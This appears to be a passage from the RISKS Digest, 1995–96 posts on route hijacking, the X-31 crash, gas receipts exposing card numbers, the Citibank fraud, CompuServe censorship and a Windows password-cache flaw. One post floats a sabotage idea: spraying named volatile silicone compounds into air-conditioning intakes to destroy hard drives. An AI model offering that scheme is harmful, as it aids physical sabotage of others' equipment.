address, but an entire C-class network.
<P>
Last night, an Internet service provider in New York added a block of
addresses for themselves to use.  They chose addresses already in use by
my North Carolina-based ISP, announced them to their provider, who in turn
announced them to MAE-East, the major east coast routing information
center.  The new addresses were established, even though they were already
assigned to us.  Until they fixed the problem, all traffic for our network
got sent to New York.  The problem in double-assigning our addresses was
compounded by the fact that neither of the N.Y. ISPs had contact people
available for 24-hour support.
<P>
The risks could be enormous.  Not only is there a potential for accidents,
but also for sabotage.  What if instead of our block of addresses, the ISP
had chosen that of the FBI, or the White House?  What if someone rerouted
a block of addresses to which people were sending credit card order
information, for 10 minutes?  We have a way to go before we can trust the
Internet to our most important messages.

<I>Thu, 28 Dec 95 18:23:24 GMT</I>
<P>
I am a bit behind with my e-mail, so have only just seen the forwarded mail
between Martin Gomez &lt;<A HREF="mailto:martin@hiflight.com">martin@hiflight.com</A>&gt; and Andy Fuller
&lt;<A HREF="mailto:acfa@eci-esyst.com">acfa@eci-esyst.com</A>&gt; in <A HREF="/Risks/17.46.html">RISKS-17.46</A>. I would like to take issue with<BR>
Martin's view.
<P>
Martin disagrees with the statement in the original posting that:-
"It is apparent to me that this crash is the result of
a bug in the flight control software and sensor hardware of the
X-31 aircraft.  The computer was unable to compensate for a loss
of the airspeed indicator."
<P>
and writes:-
<P>
&gt; That is a non-sequitur.  A "bug" is not the same as a missing feature.<BR>
&gt; Microsoft Word 6.0 can't do my taxes for me, but that's not a bug.<BR>
&gt; To me, a bug is when the computer does something other than what<BR>
&gt; the designer intended. If the designer intended the computer to detect<BR>
&gt; and compensate for the loss of a sensor, then you're right, it was a bug.<BR>
&gt; My understanding, from talking to engineers on the X-31 project at Dryden,<BR>
&gt; is that the flight computer was NOT meant to detect such failures.<BR>
&gt; It therefore acted correctly, in the sense that it did what it was<BR>
&gt; designed to do.  Obviously, it would have been nice if it could detect<BR>
&gt; that the airspeed sensor had failed, but it's inability to do that is<BR>
&gt; not a "bug" as you suggest.
<P>
and later:-
<P>
&gt; I assume your article ... is a warning to software designers to be<BR>
&gt; careful what they assume, etc.  You must realize, though, that<BR>
&gt; "it was a software problem" is the perennial cry of the hardware<BR>
&gt; engineer who asked for the wrong software, and got what he asked for.
<P>
and still later:-
<P>
&gt; If a pilot crashes the remaining X-31 because he tried to land it<BR>
&gt; vertically, or to fly coast-to-coast, that's not a software problem,<BR>
&gt; so neither is failure to detect a sensor error.
<P>
Andy offers an (unnecessary, IMHO) apology in response:-
<P>
&gt; [Guilty as charged.  I agree with you, the X-31 crashed because of a<BR>
&gt; SYSTEM DESIGN error, not a software bug.  It would have taken more than<BR>
&gt; a software change to prevent the loss of control.
<P>
Having extracted what I think are the key statements, where do I start?
<P>
Martin's attitude sounds horribly like the perennial cry of the airframe
manufacturer after an accident: "All systems were behaving as specified!",
with the (implicit or explicit) conclusion: "Therefore it must have been
pilot error!", except that in this case Martin concludes:
"Therefore it was a system requirements specification defect."
and furthermore (*TOTALLY* incorrectly, IMHO):
"Therefore the programmer is absolved of all blame."
<P>
Both Martin and Andy seem to believe that there is a world of difference
between a "system design error" and a "software bug".
<P>
In fact, a "software bug" is simply a "system design fault" which happens
to be located in software rather than in hardware. (I prefer the term
"fault" rather than "error" to denote "something wrong with the way the
system has been designed".)
<P>
In many cases, the argument as to whether it was a hardware or software
design fault that caused an accident is about as futile as arguing about
the number of angels that can dance on the head of a pin (except perhaps
during an internal post-mortem to decide whose head is going to roll!).
The system design includes both hardware and software, and the required
functions of the system are shared between them. Different designs may
provide the same overall function by partitioning the sub-functions
differently between hardware and software. A given design fault might
be corrected *either* by a software modification *or* by a hardware
modification.
<P>
For example, the Warsaw A320 crash would probably not have occurred if
the "on ground" condition had been recognised by the "compressed" signal
being received from *either* of the main landing gear struts instead
of from *both* of them. It might also not have occurred if the "Weight
on Wheels" (WOW) switches had been more sensitive. The logic whereby the
"on ground" condition is recognised could have been altered by a software
modification. In fact, a hardware modification to the struts to enable
the WOW switches to send a signal at a pressure of 2.5 tonne instead of
6.5 tonne has now been retrofitted to all of Lufthansa's A320 fleet.<BR>
This will also reduce the probability of a similar accident, and has
been available to airlines operating the A320 since before that
particular crash, although at the airlines' own expense. (Airbus, of
course, state that the retrofit is in no way connected with the
conclusions of the crash investigation, and that the modification
was originally devised for reasons of comfort rather than safety.)
<P>
I am very strongly of the following opinions:-
<OL>
<LI>If the function of a system has been so specified that it behaves<BR>
in an obviously undesirable way in some circumstances, then THAT
CONSTITUTES A FAULT IN ITS DESIGN. The fact that the fault originated
from the requirements specification phase merely indicates when and
at what level a mistake was made, not that there is no fault.
<P>
When I was active in supporting operating systems, a proportion of
the incident reports we received were closed with a classification
which meant "The system was behaving as specified but the customer
still has justifiable grounds for complaint." It was realised that
customers would not be fobbed off with the excuse "But that's what
the spec. says it should do!", and such reports were treated in
exactly the same way as those which were diagnosed as being due to
"software bugs" as more narrowly defined, i.e., "The system departed
from specified behaviour because the programmer made a mistake while
coding." In many cases, design modifications were made at a later
release to remove such faults.
<P>
<LI>The omission of an obviously desirable feature IS A DESIGN FAULT.<BR>
It is just one example of the type of fault that originates in the
requirements specification phase.
<P>
In the X-31 case, it is preposterous to argue that the inability of
the system to respond in a safe way to a sensor failure of a type
which occurs quite frequently is anything other than a FAULT.
<P>
<LI>What constitutes "required behaviour" is not merely "what is in the<BR>
specification", but "WHAT A REASONABLE USER WOULD EXPECT".
<P>
Systems operate in the real world, not in some abstract model of it.
If they are defined according to an inaccurate model of reality, they
must be modified to take account of a more accurate model.
<P>
A reasonable pilot would expect a flight control system to react in
a safe way to an air-speed sensor failure. Only an unreasonable idiot
would expect it to convert a horizontally landing aircraft into a
vertically landing aircraft.
<P>
<LI>THE SOFTWARE ENGINEER CANNOT AFFORD TO IGNORE THE WHOLE SYSTEM AND ITS<BR>
DOMAIN OF APPLICATION.
<P>
This is one of the main characteristics (IMHO) which distinguishes a
"software engineer" from a "monkey see - monkey do" programmer, and
is one of the things I try to drum into the heads of my students on
the software engineering modules. One of the first things they are
taught is that it is essential to find out what the *real* requirements
are (as opposed to what the customer initially *thinks* they are),
and to use common sense and engineering judgement to elicit a COMPLETE,
consistent and unambiguous specification.
<P>
If it did not occur to the people who wrote that code to ask the
hardware team what action the system should take in the event of a
sensor failure, then they should be drummed into the manager's office,
where, in front of a parade of their colleagues, their software
engineer's badges are ceremonially torn from their designer T-shirts
and their flow-chart templates broken across the manager's knee,
before they are marched off to spend the rest of their careers
maintaining COBOL programs in the Commercial Division.
<P>
<LI>BOTH HARDWARE AND SOFTWARE DESIGNERS MUST THINK IN SYSTEM TERMS.
<P>
Q: "How many software engineers does it take to change a light-bulb?
A: "It can't be done; it's a hardware problem!"
<P>
Sorry! That attitude won't do where real-time safety-critical
embedded software is concerned!

<I>Thu, 21 Dec 1995 18:01:22 -0800</I>
<P>
In the September/October 1995 issue of _IDEMA_Insight_ (a magazine for
people in the hard disk drive business), there's an article "Adhesive
Dispensing Components: A Hidden Source of Silicone Contamination" by Larry
Sutton which I find deeply disturbing.  The article can be summarized as
decrying the fact that you can't buy certified silicone-free dispensing
syringes.
<P>
This is important because even tiny levels of silicone contamination are
fatal to hard disk drives.  They screw up the interface between the disk and
the head, causing errors and crashes.  This article is a complaint that the
use of silicone oils as mold release agents in the plastic injection molding
of adhesive-dispensing syringes is a cause of reduced manufacturing yield
and product lifetime for hard disk drives.  Even when the vendor asserts
that silicone mold release agents were not used for the syringes, there can
be cross-contamination from other presses in the same facility in which
silicone oils are used.  Just that tiny amount of contamination, on the
inside surface of a syringe used to dispense, for example, an adhesive used
to attach a disk head to a positioning mechanism, can result in premature
failure of the disk drive.
<P>
Add to this the fact that the air inside a hard disk drive is at equilibrium
with the atmosphere.  Every hard disk drive has a vent or "breather hole"
through which air can pass.  The vent is filtered, so no particles can pass
through, but the pores in the filter are much larger than even the largest
molecules.
<P>
When the drive starts up, it gets warm, which causes the air inside the disk
drive to expand.  Excess air goes out the breather hole.  When the disk is
shut down, it cools off, and the air contracts drawing in more air through
the breather hole.  Even on days when the disk drive is not used, there is
passage of air through the breather hole caused by the daily fluctuation in
barometric pressure.
<P>
So, a water balloon filled with low molecular weight silicones, such as a
silicone mold release agent, thrown against an air-conditioning system
intake, seems to me to be a potential hard disk drive killer.  Even better
might be a pure silicone oligomer.  E.g., octamethylcyclotetrasiloxane is
widely used as a precursor for making silicones such as adhesives and
sealants so it's fairly cheap, about $20 a pound for industrial grade.  It's
both volatile and reactive, undergoing a ring-opening polymerization.
<P>
What would it be like to be attacked?  If a slow releasing system like an
oil were used, the target might not even notice that instead of serving for
5 or 10 years, the hard drives were crashing after 2 or 3 years.  If a pure<BR>
volatile silicone oligomer were used, who knows?  All the drives might crash
on the same day.

Peter Denning mentioned the problems of binary representation of decimal
numbers.  Bleah!  But since it *is* an IEEE standard, the very group who
created it would (should?) have known the Risks of that!  (Or am I assuming
too much?)  Of course, I'm sure the real reason that that IEEE standard is
so popular is because Intel's co-processors use it.  Hmm...
<P>
The first computer I owned, a TI-99/4a, used a base-100 encoding scheme
for floating point - so it had a *guaranteed accuracy* for 13-digits.
True, it was not an efficient use of memory, like the IEEE format,
but the IEEE format cannot guarantee accuracy.
<P>
Microsoft had their own floating point format for a while.  What was it?
Was it binary, too?  Or did it have a BCD-type storage?  Perhaps they should
have stuck with it.

Subject: Giving CMU the finger...
<P>
In fact, this *is* a phonetic match, as I understand the technology.<BR>
In the world of phonetics...<BR>
J and Y are regarded as the same<BR>
W and GH are pretty close<BR>
B is B<BR>
and vowels are ignored. So the CMU white pages system really was doing
its best. You would have been much more appreciative if you'd been
trying to find H. Yaghoobi, and tried "finger jahuby".
<P>
Of course, unless you've had a lesson in the CMU finger system, there's no
way to know that it uses such generous phonetic matching, when no exact
user-id matches. There is a formulation which does what you want: "finger
j.webb"; but there is no way for outsiders to learn this fact.
<P>
I guess the moral is that it's risky to extend standard protocols like
finger, even if the extension adds functionality.

This reminds me of a bizarre piece of behaviour exhibited by the Microsoft
Word grammar checker (this was in version 5 -- I don't know if it's still
there):
<P>
I ran the grammar checker over a project proposal containing the phrase
"Regular QA reviews will take place" (or something similar). The grammar
checker highlighted "QA reviews", suggested that this might be a foreign
phrase, and asked "Is the expression 'rigor mortis'?".
<P>
No particular RISK here, other than that associated with blindly accepting
default decisions from grammar or spelling checkers -- I wonder what the
customer would have made of a proposal stating that "regular rigor mortis will
take place"?

<P>
Over the last few months, I have pulled up to self-serve gasoline pumps that
accept credit card payment, and noticed that a previous customer has left
behind the receipt that gets printed at the end of the transaction. Some
pumps make you explicitly hit a button to get a receipt, but others do it
automatically.
<P>
So what's the risk? The risk lies in the information that you leave behind
if you drive away without taking the receipt, or if you simply toss it in
the trash nearby. The receipts from different gas companies have different
information, but the worst risk I have seen so far is on the Amoco receipt
where the account number and CUSTOMER NAME appear on the receipt. I also
found a Chevron receipt that has someone's account number on it, and the gas
station's name and station number. Since this particular gas station is
"Juan's Chevron" I suppose a spoofer could call up Chevron posing as Juan
and give their station number to legitimize their spoof, so here there is
also a risk to the station owner. Mobil receipts have less information than
the Amoco or Chevron ones. But as long as someone gets a legitimate account
number, this is probably enough information to perpetrate some damaging
fraud (for example, setting up a bogus gas station, then turning in credit
card receipts and getting paid for them by the gas provider - this actually
happened down here a number of years ago).
<P>
Here's a list of the information provided on the receipts (besides the
amount of gas and price per gallon) from the three providers I mentioned
above. I don't know if the gas companies use different models of pumps in
different parts of the country (I'm in South Florida), so your receipts may
differ. Perhaps we could collect information from other gas providers, and
urge them to be more sensitive to their customers' privacy.
<P>
AMOCO: Station name and address, date, time, CUSTOMER NAME, CARD ACCOUNT
NUMBER, reference number
<P>
CHEVRON: Date, station name and address, station number, CARD ACCOUNT NUMBER,
invoice number, authorization number

It occasionally snows in Massachusetts. Last week most of the state got at
least twelve inches of snow in a storm that started Tuesday evening and kept
going most of Wednesday (3 Jan 96). The storm was forecast several days in
advance and many workers avoided a treacherous drive to work by staying home
and trying to telecommute.
<P>
Friday's Boston Globe had a short article that reported that Nynex
experienced a 50% increase in phone-line demand in some areas. This resulted
in some users having to wait for a dial tone and hearing quick busy signals
once they got one.
<P>
This appears to have been a minor and temporary inconvenience and we all got
back to work on Thursday. But I think back to the Blizzard of '78, when a
30+ inch snowfall closed down the state for almost four days. (The state<BR>
prohibited non-emergency travel and several major highways were blocked by
snow covered abandoned cars.) If that happened today, all of home modems and
fax machines that might be used by homebound workers might severely stress a
phone system that was already suffering from weather related equipment and
wiring breakdowns.

A recent AP item from Denver (Denver Baggage System Shutdown) indicates that
Denver's long-plagued automated baggage-handling system (most recently, see
<A HREF="/Risks/16.83.html">RISKS-16.83</A>), which finally went on-line in October 1995, has a software
problem that has caused its sole user (United Airlines) to shut down use for
inbound baggage -- which has been handled manually since 22 Dec 1995 pending
further analysis, even though the apparent software problem has been fixed.
On the other hand, only 15 of 27,706 bags missed their delivery on 22
December.  (No details were available on the nature of the bug.)

Russian pleads guilty to stealing from Citibank ...

<P>
&gt;&gt; Russian pleads guilty to stealing from Citibank accounts &lt;&lt;
<P>
&gt;&gt;  NEW YORK (Reuter) - A Russian national has pleaded guilty for his role
in a scheme to penetrate Citibank's computers, steal millions from corporate
accounts and transfer the funds to overseas accounts, federal prosecutors
said Thursday.  Alexei Lachmanov, 28, faces a possible maximum sentence of
five years in prison and a $250,000 fine for participating in the scheme
that involved the illegal transfer of funds to bank accounts he controlled
in Israel. &lt;&lt;
<UL>
<LI>The gang's mastermind was Vladimir Levin who was arrested at Heathrow
Airport, London UK and is awaiting extradition.
<P>
<LI>The prosecution believes Levin working in the Russian firm AO Saturn
manipulated the computers at Citibank to transfer funds to accounts in
Finland, Israel and Bank of America.
<P>
&gt;&gt;      The charges against Lachmanov allege that in August 1994 he told
co-conspirators in Russia about his personal accounts in Tel Aviv, Israel. The
co-conspirators had gained unauthorized access to the Citibank Cash Management
System, which allows Citibank customers to access a computer network and
transfer funds from their Citibank accounts to accounts at other financial
institutions. &lt;&lt;
<P>
<LI> Lachmanov admitted to transfers to account to five Tel Aviv banks, and
attempting to withdraw US$940,000 from those accounts.
<P>
<LI>Three other members of the gang have pleaded guilty.

There was a story tonight on the _60_Minutes_ television program on CBS
describing the recent assassination of a terrorist in Israel.
<P>
Known as "The Engineer", he designed bombs used in a number of terrorist
incidents in Israel.  At the time of his death, he was in hiding.
<P>
According to the news story, he was killed by a bomb planted inside a
cellphone which was activated by a code sent to the cellphone.  The story
was that the cellphone had been provided by a trusted person who was
presumably an Israeli undercover agent.
<P>
This implied that only one sabotaged cellphone exists.  It seems more likely
to me that if you were tracking down a highly elusive enemy using
cellphones, you'd infiltrate many more than one cellphone.
GAZA-PHONES-ARE-US might be selling nothing but booby-trapped phones during
that end-of-the-year "blowout" sale!
<P>
Then, all you have to do is monitor enough telephone conversations until you
catch the guy while he uses one of your sabotaged phones.  Send the code,
and BOOM!
<P>
This raises some interesting RISKS possibilities.  Selective assassination
by dialing in a number?  Can the system be hacked?  Does the system make
mistakes?  [What about, Sorry, wrong number?]

EDP - Police Expert:  Criminal use of computer networks increasing
<P>
Munich (German Press Agency) - criminals are increasingly using
the electronic possibilities of computer networks. According to
the director of the computer crime unit of the Bavarian State
Prosecutors Office in Munich, Werner Paul, "The range extends
from child pornography to narcotics, the arms trade, software
piracy and credit-card fraud."  Herr Paul was speaking on Friday
to the German Press Agency.
<P>
Key points:
<UL>
<LI>The investigation of CompuServe in Germany on suspicion of
distributing child pornography is not an isolated case.
<P>
<LI>On-line access suppliers can no more distance themselves from
distribution of pornography than from distribution of illegal
copies of proprietary software, he said.
<P>
<LI>Herr Paul argued that the issue is not that the access providers
are criminals; the problem is that criminals are using the access
providers.
<P>
<LI>In the fight against computer crime, the networks must, in his
opinion, help the police authorities; he conceded that the police
authorities do not have enough highly qualified personnel for such
investigations.

After cutting off subscribers' access to more than 200 electronic bulletin
boards that feature adult material last week, CompuServe now is trying to
find a technical way to block only German subscribers, whose government
originally had lodged the complaint against the commercial online provider.
Industry executives are pointing out that this would set a bad precedent,
possibly encouraging other governments to make their own demands regarding
content restrictions.  "Every country will now jump in and say we don't want
any antigovernment propaganda.  Every country in the world will push its own
local hot button," says a University of Pennsylvania professor.  (*Wall

Note: DaveR, a user on an internal IBM system in Lexington, KY, was browsing
the ESPN Web pages and came upon some correspondence discussing U of K
basketball player Jared Prickett.  However, the name appearing on the page
was "Jared ett" -- some automatic censor logic was removing "Prick" from
posts to the ESPN discussion boards.  I have encouraged DaveR to submit
directly a RISKS article about this [which is now unnecessary], but I
thought the following might make for an interesting counterpoint [...].
<P>
Back when I was in college (many many years ago), we had an HP 2000 Time
Shared Basic system.  It was a fairly primitive system by current standards
(16 TTY terminals), but the neatest thing since sliced bread at the time.
There were several students, however, who just did not get along well with
computers.  One of these, a classmate of mine, had spent several hours
creating a program to do some task, but the program was not working as
expected.  In a fit of frustration, the student typed in "SCR*W YOU" on the
TTY.  However it was the student who was screwed. Any line not prefixed by a
line number was interpreted by the system as a command, and the system
ignored anything beyond the first three letters of commands.  So "SCR*W YOU"
was seen as "SCR", meaning "scratch" -- the system's command to erase the
current workspace.
<P>
In a final bit of irony, the system responded with its usual response --
"OK" -- after completing the "scratch" operation.  The student was laughing
at the system's response -- until he realized his program had disappeared.

A powerful rule-of-thumb from control theory says that the uncertainty
in a control system will gravitate towards the degree of freedom that is
hardest to measure and/or hardest to control.  A classic example of this
problem is the 'horizon effect' in computer chess programs, in which bad
(or good) things that happen more moves ahead than the program can look,
aren't considered at all; this provides a way for a fair human strategic
player to beat a tactically excellent chess program.
<P>
Politicians appear to be blissfully unaware of this rule, and as a result
they go off so half-cocked that their 'cures' are much worse than the
diseases for which they are prescribed.  For example, instead of having
newsgroups whose content is trivially identified, so that people can stay
clear of them, the newsgroups will now get innocuous names, and it will be
much easier for someone to wander into the middle of an ogrey (sic).
However, Santayana was right, and people must learn most things first-hand,
so here goes.
<P>
Instead of beating our breasts over Compuserve's censorship of Usenet
newsgroups, we should should respond to this censorship in the same way that
people have all through history -- by using metaphoric code.  For example,
some of the nursery rhymes we learned as children were actually very caustic
statements about the powers-that-be of the time, but which if said in plain
text would have gotten the speaker's spine stretched and/or severed.
<P>
Given the indexing machines like www.dejanews.com and
www.altavista.digital.com, one can get a list of the 2000 most frequent
adjectives, verbs and nouns (exclusive of the proscribed groups, whose names
are available at www.eff.org).  We and then construct a mapping from these
most frequent words onto the words of love &amp; hate, which can provide a
vocabulary rich enough for most public purposes.  (A brief scan of the
'personals' section of the local newspaper indicates that 2000 words is far
more than should be necessary, and probably exceeds by two orders of
magnitude the vocabulary of cheap porn flicks.)
<P>
We now fix our personal spelling dictionaries to suggest the appropriate
mappings, and continue usenetting as before.
<P>
Because we have utilized the most common words from Usenet, any attempt to
scan the news with a simple 'stop list' will prove futile and/or will
succeed in killing off 99% of _all_ the news.
<P>
Example:
<P>
"There once was a student from Nantucket;<BR>
whose thesis was so long he could..."
<P>
(You get the picture.)
<P>
Additionally, some uncommon words like 'exon' and 'compuserve' can also be
included in the dictionary.  You can intuit their meanings from the usage
below.
<P>
"The first night we met, we exoned like bunnies; our son George is the
result."
<P>
"She was just a compuserver that I met in an IRC Chat Room; she was picked
up by the vice squad for compuserving on Hollywood Boulevard before she
discovered Cyberspace."
<P>
Given these meanings, Compuserve will be forced to 'stoplist' these words,
which among other things will lead to a Russell-Goedel paradox.

<P>
And the story looks more and more confused with every hour that passes...
<P>
But does anyone else remember a similar incident, several years ago, over
the game Wolfenstein 3D?
<P>
This precursor to Doom, distributed in much the same way, was made
available over Compuserve.  Unfortunately, some of the graphics included
pictures of Adolf Hitler and assorted Nazi insignia, on the walls of the
rooms where the player was killing anything and everything that moved.
<P>
This made the game illegal in Germany.
<P>
The game was withdrawn from Compuserve, worldwide.
<P>
Back then, I wasn't on the net.  I got my news at a slower pace, in
monthly magazines.  According to the accounts, as I recall, there was
some confusion about who took the decision to remove the game, and
Compuserve said it was the decision of the forum sysop (is that the
correct term?).
<P>
In any case, the problem of local laws affecting an international
computer network is _not_ new, and Compuserve staff didn't need to read
RISKS to know about the possibility.

Actually, I think this should have been titled "Compuserve censors itself."
Though I don't agree with the actions of the German police or those of
Compuserve, the fact remains that Compuserve made this choice themselves.
<P>
Why does it matter? Simple; this is all the more reason for anyone who truly
cares about freedom of expression in the electronic medium to dump giant,
corporate providers like Compuserve and AOL and instead patronize their
local ISPs, who (in my experience) are usually very serious about providing
their customers with everything that the 'net has to offer.
<P>
Of course, not every town yet has an ISP, so this is not an option for
everyone. But even if only the people in towns that do have good ISPs did
this, C$ and AOL would feel it.

<P>
After some discussions with State Attorneys in Munich, there is evidence
that CompuServe activities to shutdown worldwide access to 200 electronic
discussion groups were legally UNJUSTIFIED to the extent as experienced!
<P>
The legal background is Para.184 of German Penal Code concerned with
"Pornographic Writings" (Schrift). The lengthy paragraph forbids to
distribute and give access to pornographic writings to persons under 18
(sentence 1), and it also forbids pornographic broadcasts (sentence 2). Esp.
provisions were recently introduced (1994) to forbid distribution,
presentation, production etc of child pornography; this part applies to
persons of any age.
<P>
In early November 1995, Munich police notified Bavarian state attorney`s
office that CompuServe`s German subsidiary (with its office in Unterhaching,
a suburb of Munich) offers access to child pornography also to persons under
18. In German Penal Code, this is an offence which the state attorney MUST<BR>
prosecute (Offizialdelikt). State Attorney asked the district court
(on Nov.11) for a search warrant. On Nov.22, attorneys and police experts
searched CompuServe`s office for evidence. CompuServe was given a list
with 200 electronic fora to which Para.184 MIGHT apply, but it
was explicitly made clear that CompuServe had the responsibility to
analyse which of these fora really offended German law. (Indeed, a careful
inspection of knowledgeable people would have made clear immediately
that several items on this were NO valid candidates for Para.184!)
<P>
CompuServe reacted VERY late (shortly before Christmas), and CompuServe
OVERREACTED in blocking access to ALL these electronic fora WORLDWIDE.  As
most national laws (with exception of some laws requesting universal
applicability :-), German law deliberately applies to Germany :-)!  Either
was CompuServe TECHNICALLY UNABLE to react ONLY FOR GERMAN users (and leave
worldwide users unaffected). OR CompuServe choose its overreaction carefully
to produce worldwide uproar against applying national law! Anyhow,
CompuServe evidently failed to legally analyse which of the 200 el.fora
really addressed the intent of Para.184!
<P>
The procedure of Bavarian State Attorney may have one week point in whether
the term "writing" (evidently meant by legislators as applying to
traditional paper-work) may apply to "electronic documents" even in "virtual
form". Current interpretation here is that "writing" also applies to
printouts and stored files (as they may be printed). Evidently, this MAY NOT
APPLY to pictures in RAM just displayed on a screen, as long they are not
stored or printed.  This may also not apply even to disk cache as long as
this is only accessible to the display system. On the other hand, if
CompuServe stores such files locally (in Munich), e.g., on a mirror-site, and
as CompuServe does *not* differentiate between users according to age (e.g.,
those under 18), para.184 may indeed apply if CompuServe can be held
responsible for the content of their files.
<P>
It would be interesting to legally clarify also in Germany the question
of responsibility, as recently clarified in the Prodigy and CompuServe
cases in USA (in one case, a moderated group was regarded as being sort
of publisher with responsibility for the content, while in another case,
an unmoderated forum was regarded merely as book-seller, with NO re-
sponsibility for the content traded). No similar case has been dealt-
with in Germany, so far.
<P>
In this situation, there is NO evidence that the Bavarian procedure in this
case may be a signal for introducing censorship in the Internet (as many
experts had feared, including my initial reaction :-).  But this case may be
helpful to start discussions of self-control, including topics of
pornography, virtual violence or assault! From a German point of view, it is
indeed hard to understand that Nazi propaganda (legally forbidden in Germany
since WW II for good reasons, for which we have been re-educated and
democratized :-) flows into Germany from Nazi groups, e.g., in Canada, USA
and Denmark. Free Flow of Information requires responsibility and ethical
standards which so far have hardly been developed in networld. So far, some
universities with some sort of "Code of Ethics" (e.g., Hamburg university)
have sopped access to (few) pornographic electronic fora since some time.
This is NOT a matter of censorship but a matter of Ethics and
responsibility!

<P>
&gt;Each PC will have to come supplied with a re-load trusted bios program,<BR>
&gt;but I have no idea how (or if) this would work.
<P>
It's not just PCs that come with this "feature" but also modems, tape
drives, and many other pieces of hardware which allow reprogramming in the
field.  Modem manufacturer Zyxel has chosen to put more of it's modems
"brains" in the flashed software than in hardware which allows them to have
supported new features which weren't even thought of when the modem was
designed (to an extent).
<P>
But back to the PCs...  I own a couple of PCs which use Flash ROMs.  I find
it quite assuring to know that I can upgrade to the latest BIOS just by
loading a floppy and letting it rip.  It's not quite THAT easy though...
Many of the BIOS upgrades will need to update the "boot" portion of the ROM
which requires physically moving a jumper on the motherboard.
<P>
These boards also have the ability to boot a minimal system in the event of
a bad flash.  Unfortunately I *DID* have to test this a short while back.
But as with everything, with proper measures taken it seems to be reasonably
safe to do.  This includes making sure you have the image of the old BIOS on
disc and recommendations have been made on UseNet to not try flashing if
there's a storm (loss of electricity risks).
<P>
Of possible interest to other RISKS readers is the method that some of the
larger Hewlett Packard machines have used.  They have two banks of
programmable memory which you can boot from.  If for one bank fails due to a
an upgrade failure or chip failure, an operator can switch over to the other
bank and boot with the previous version or a backup copy.  Specifically I
have observed this on a T-500 class machine (I noticed during a firmware
upgrade that there were several options and asked the HP field engineer
about it).
<P>
What do you expect on a million-dollar piece of hardware though?
<P>
&gt;Another RISK is that the flash RAM will probably only be good for tens<BR>
&gt;of program cycles (updates) to keep costs down.
<P>
While this may well be a RISK (the motherboard I bought has a reputation
of using workstation-quality oscillators so hopefully it's not a risk for
me), I think it's worth pursuing to "root cause"...
<P>
Is the manufacturer to blame?  I don't think so...  Look at what we now
equip our PCs with -- possibly cheap FlashROMs that may be only good for 10
cycles, the RAM doesn't even so much as parity-check any more (the Triton
chipset ignores parity bits if your RAM even has it), single spindle hard
drives, etc...
<P>
By contrast, most "workstation" class machines would have possibly better
quality components inside, ECC (error correcting) memory, watchdog timers
(to detect when the software isn't responding and reset the machine), most
of them still use single-spindle hard drives though...
<P>
(I must say that I was pleasently surprised to see that the first Pentium
Pro motherboard I saw DID use ECC RAM)
<P>
The "root cause" of these shortcomings is of course the consumers.  Why pay
for workstation-quality components when they can get "the same computer" for
hundreds if not thousands of dollars less from someone next door?  I guess
I'm kind of to blame too...  Even though I wanted a PC with ECC memory, RAID
storage, and a watchdog timer, I bought the best PC I could because going
with these parts would push the price up by literally 3 times.  I am planing
on installing a watchdog, and I haven't been able to locate PC-class
motherboards with ECC ability.
<P>
Everyone claims to want reliability and good service, but few want to pay
for it.  Witness people spending half an hour driving to another store to
save $.30 on laundry detergent.  Or how about the person bashing Gateway (a
well known mail-order computer seller) for sending out a replacement
motherboard and expecting one UseNet poster's daughter to be able to replace
it.  I'm sure if they brought the machine to the resellers door the
motherboard would have been replaced for them...

My car radio was stolen the one night I didn't lock my car, so I made the
following observation.
<P>
Many modern cars have integrated alarm systems.  By "integrated" I mean that
locking the car automatically arms the alarm, and unlocking the car
automatically disarms the alarm.  A side effect is that a light flashes on
the dash to indicate the alarm is armed.
<P>
A thief who frequents a neighborhood will know which cars have alarms.  If
he sees that the light is not flashing, he will know that the car is not
locked without having to either approach the car closely or do something
suspicious like try the door handle.  So the one night in a hundred when you
fail to lock the car will likely be found out.  (And you might blame it on
Murphy!)
<P>
It is ironic that the light that is meant to add protection actually reduces
it under some circumstances.  I intend to disable the alarm flasher, leaving
only the radio flasher, which turns on whenever the car is turned off.

The first-ever court-approved wiretap of an e-mail account has resulted in
the arrest of three people charged with running a sophisticated
cellular-fraud ring.  The alleged mastermind, a German electrical engineer,
advertised his illicit wares on CompuServe, where they caught the attention
of an engineer at AT&amp;T's wireless unit.  The Secret Service and the Drug
Enforcement Agency then got into the act and obtained the Justice Dept.'s
permission to intercept e-mail messages between the alleged perpetrator and
his accomplices.  "This case represents the challenges in the future if we
can't get ahead of the curve in technology," says a U.S. attorney, whose
office is prosecuting the case.  (*Wall Street Journal*, 2 Jan 1996, p.16)

Air Traffic Outage (by George Tibbits, Associated Press Writer)
<P>
SEATTLE (AP) -- A technician won't be disciplined for an accident that cut
off all power to an air-traffic control center and delayed flights
throughout the Pacific Northwest, an FAA spokesman said Sunday.  The power
outage early Saturday darkened radar screens and silenced radios and
telephones at the Federal Aviation Administration center, leaving
controllers completely in the dark for at least five minutes.

Key points:
<UL>
<LI>Over 50 planes and 150 flights delayed 1 hour or more because

Not surprisingly, many folks hastened to remind me that the "o" in "ghoti"
is properly pronounced as the "o" in "women".  Yes, of course, but I was
seeking a minimalist alternative, noting that pronouncing "ghti" as "fsh"
sounds pretty much like "fish" in most dialects -- although phonetically the
"o" in "women" might be considered necessary for precision in high english.
Incidentally, for those of you who are language buffs (in any language),
pick up a copy (in paperback) of Anthony Burgess' "A Mouthful of Air".  It
is a truly marvelous book about language and languages.  PGN

Please do not dismiss this as mere "Microsoft Bashing." c2.org has
similar promotions running for Netscape, DigiCash, and Java.

The following is a quote from Microsoft's "Knowledge Base" technical
support and marketing database, which is online in CompuServe and at:

Security of the Windows for Workgroups Password Cache<BR>
_____________________________________________________
<P>
The password list file is encrypted with an algorithm that meets the U.S.
government Data Encryption Standard (DES). This encryption technology is
the highest security allowed in software exported from the United States.
The odds of breaking the encryption algorithm are less than those for
random guesses of what the password might be.
<P>
Even if your logon password is blank, Windows for Workgroups generates
seemingly random data in your PWL file, so you cannot discover the
passwords if you look at the PWL file using a file viewer. Currently, no
user interface exists that allows you to unencrypt passwords in the PWL
file, so password caching in Windows for Workgroups is as secure as the
choice of the password used to encrypt your PWL file.
<P>
As Microsoft well knows, this is completely untrue. The rest of the world
has known that this is untrue since November 29th. Microsoft quietly
acknowledged on December 7th (after a day of much "Internet Strategy"
hype, and after the deadline for the morning papers) that the exact same
implementation was insecure in Windows 95, and claims to have released a
patch that fixes the problem (the efficacy of the Win95 patch does not
appear to have been verified by anyone outside Microsoft, however).
<P>
Microsoft has not even admitted that this bug in both Windows 95 and
Windows for Workgroups affects Windows for Workgroups, apparently because
they have decided not to fix it.
<P>
Information on the .PWL implementation bugs was first broached on the
sci.crypt newsgroup in late November 1995, then discussed on the
